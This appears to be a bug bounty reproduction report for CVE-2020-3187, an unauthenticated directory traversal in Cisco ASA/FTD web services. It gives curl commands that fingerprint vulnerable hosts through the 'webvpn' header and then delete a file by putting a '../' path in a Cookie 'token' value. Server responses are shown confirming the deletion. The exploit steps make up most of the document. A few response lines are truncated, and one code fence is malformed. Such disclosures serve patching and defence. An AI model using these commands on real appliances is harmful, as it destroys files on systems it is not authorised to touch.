
# Unauthenticated Arbitrary File Deletion (CVE-2020-3187)

## Summary

A vulnerability in the interface of Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to conduct directory traversal attacks and obtain read and delete access to sensitive files.

## Steps To Reproduce:
 

 1. Identifying vulnerable host by send request to `/+CSCOE+/session_password.html`
```
curl -skiL https://$DOMAIN/+CSCOE+/session_password.html
```
2. You will see this output

```
TP/1.1 200 OK
Content-Type: text/plain
Content-Length: 0
Cache-Control: no-cache
Pragma: no-cache
Connection: Keep-Alive
Date: Sat, 05 Jun 2021 03:06:18 GMT
X-Frame-Options: SAMEORIGIN
webvpn: 


```

If the **webvpn** key is present in the response header, then it's vulnerable to CVE-2020-3187. 

Let's try another thing: Perform a exploit to delete files by adding `token` in cookie header request.


 1. Check that a file is accessible.

```
curl -Ik https://$DOMAIN/+CSCOU+/login-header-icon.jpg
P/1.1 200 OK
Content-Type: image/jpg
Content-Length: 6357
Cache-Control: max-age=6000
Connection: Keep-Alive
Date: Sat, 05 Jun 2021 03:08:20 GMT
X-Frame-Options: SAMEORIGIN


```
 2.  Let's now remove the file using a Cookie header with the filename as **token.** 

``` 
curl -skiL https://$DOMAIN/+CSCOE+/session_password.html -H "Cookie: token=../+CSCOU+/login-header-icon.jpg" 

P/1.1 200 OK
Content-Type: text/plain
Content-Length: 0
Cache-Control: no-cache
Pragma: no-cache
Connection: Keep-Alive
Date: Sat, 05 Jun 2021 03:09:53 GMT
X-Frame-Options: SAMEORIGIN
webvpn: 


```

Now let's check if the file was deleted successfully:

```
curl -Ik https://$DOMAIN/+CSCOU+/login-header-icon.jpg
HTTP/1.1 404 Not Found
Cache-Control: no-cache
Pragma: no-cache
Connection: Close
Date: Sat, 05 Jun 2021 03:10:37 GMT
X-Frame-Options: SAMEORIGIN


``

## Impact

An exploit could allow the attacker to view or delete arbitrary files on the system.


### Supporting Material/References
[Report 978335](https://hackerone.com/reports/978335)
[NVE](https://nvd.nist.gov/vuln/detail/CVE-2020-3187)



